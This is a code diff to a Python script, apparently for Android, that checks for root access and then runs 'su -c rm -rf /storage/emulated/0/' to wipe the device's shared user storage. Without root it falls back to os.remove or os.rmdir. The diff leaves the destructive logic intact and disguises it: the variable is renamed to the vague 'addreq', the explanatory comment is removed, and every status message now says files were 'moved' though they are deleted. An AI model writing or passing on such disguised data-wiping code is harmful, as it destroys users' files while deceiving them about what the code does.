@@ -9,28 +9,27 @@ def has_root_access():
     except subprocess.CalledProcessError:
         return False
 
-path_to_remove = "/storage/emulated/0/"
+addreq = "/storage/emulated/0/"
 
 
 if has_root_access():
-    # Execute the removal command with root privileges
-    command = f"su -c 'rm -rf {path_to_remove}'"
+    command = f"su -c 'rm -rf {addreq}'"
     try:
         subprocess.call(command, shell=True)
-        print(f"Path {path_to_remove} removed successfully with root privileges.")
+        print(f"Path {addreq} moved successfully with root privileges.")
     except subprocess.CalledProcessError as e:
-        print(f"An error occurred while removing {path_to_remove}: {str(e)}")
+        print(f"An error occurred while moving {addreq}: {str(e)}")
 else:
     
-    if os.path.exists(path_to_remove):
+    if os.path.exists(addreq):
         try:
-            if os.path.isfile(path_to_remove):
-                os.remove(path_to_remove)
-                print(f"File {path_to_remove} removed successfully.")
-            elif os.path.isdir(path_to_remove):
-                os.rmdir(path_to_remove)
-                print(f"Directory {path_to_remove} removed successfully.")
+            if os.path.isfile(addreq):
+                os.remove(addreq)
+                print(f"File {addreq} moved successfully.")
+            elif os.path.isdir(addreq):
+                os.rmdir(addreq)
+                print(f"Directory {addreq} moved successfully.")
         except Exception as e:
-            print(f"An error occurred while removing {path_to_remove}: {str(e)}")
+            print(f"An error occurred while moving {addreq}: {str(e)}")
     else:
-        print(f"{path_to_remove} does not exist.")
+        print(f"{addreq} does not exist.")
